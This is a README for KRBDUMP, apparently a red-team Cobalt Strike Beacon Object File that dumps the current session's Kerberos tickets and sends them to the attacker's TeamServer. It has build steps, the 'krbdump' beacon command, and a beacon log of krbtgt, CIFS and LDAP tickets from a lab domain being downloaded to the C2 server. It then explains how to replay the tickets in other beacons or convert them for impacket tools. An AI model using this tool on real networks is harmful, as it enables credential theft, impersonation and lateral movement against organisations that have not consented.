# About

KRBDUMP is a tool that is designed to dump the the current kerberos tickets to the Cobalt Strike downloads so that they can be passed to the other toolsets, or imported into other beacons / session to perform user impersonation.

It is designed to work purely with Cobalt Strike through its 'Beacon Object File' format so that you can more easily play with Kerberos tooling without the need for external toolsets. This has been tested in a few different labs to ensure it works properly.

## Build

To build the 'Beacon Object File'  you will need mingw-w64 from musl.cc. Once you've installed the compilers within your PATH for x86_64 and i686, run `make`, which will build the BOF file to be used with Cobalt Strike.

Once you've build the corresponding KRBDUMP BOF for their respective architectures, simply import the [KrbDump.cna](KrbDump.cna) script into your Aggressor script console. You're ready to start using it!


## Usage

Its relatively simple! Simple execute `krbdump` from a Cobalt Strike Beacon, and your tickets ( listable via klist or KrbList ) will be downloaded in memory to the TeamServer.

```
beacon> krbdump
[*] Tasked Beacon to dump kerberos tickets for the current logon session.
[+] host called home, sent: 3992 bytes
[*] started download of beacon-655660392-0-40e10000-edr-wsk-s1$@krbtgt:EDRLAB.LOCAL-EDRLAB.LOCAL.kirbi (1605 bytes)
[*] download of beacon-655660392-0-40e10000-edr-wsk-s1$@krbtgt:EDRLAB.LOCAL-EDRLAB.LOCAL.kirbi is complete
[*] started download of beacon-655660392-1-40a50000-edr-wsk-s1$@cifs:dc.edrlab.local-EDRLAB.LOCAL.kirbi€ (1544 bytes)
[*] download of beacon-655660392-1-40a50000-edr-wsk-s1$@cifs:dc.edrlab.local-EDRLAB.LOCAL.kirbi€ is complete
[*] started download of beacon-655660392-2-40a50000-edr-wsk-s1$@cifs:DC.EDRLAB.local:EDRLAB.local-EDRLAB.LOCAL.kirbi (1572 bytes)
[*] download of beacon-655660392-2-40a50000-edr-wsk-s1$@cifs:DC.EDRLAB.local:EDRLAB.local-EDRLAB.LOCAL.kirbi is complete
[*] started download of beacon-655660392-3-40a10000-edr-wsk-s1$@EDR-WSK-S1$-EDRLAB.LOCAL.kirbi (1524 bytes)
[*] download of beacon-655660392-3-40a10000-edr-wsk-s1$@EDR-WSK-S1$-EDRLAB.LOCAL.kirbi is complete
[*] started download of beacon-655660392-4-40a50000-edr-wsk-s1$@LDAP:DC.EDRLAB.local:EDRLAB.local-EDRLAB.LOCAL.kirbi (1572 bytes)
[*] download of beacon-655660392-4-40a50000-edr-wsk-s1$@LDAP:DC.EDRLAB.local:EDRLAB.local-EDRLAB.LOCAL.kirbi is complete
[*] started download of beacon-655660392-5-40a50000-edr-wsk-s1$@ldap:DC.EDRLAB.local-EDRLAB.LOCAL.kirbi€0ËZþ (1544 bytes)
[*] download of beacon-655660392-5-40a50000-edr-wsk-s1$@ldap:DC.EDRLAB.local-EDRLAB.LOCAL.kirbi€0ËZþ is complete
```

![](https://i.imgur.com/JIZ5f8T.png)

The exported tickets are in KIRBI format, so that can be imported directly into other beacon with `kerberos_ticket_use`, or passed to other impacket tools with ticketconverter to move them to a the CCACHE format.
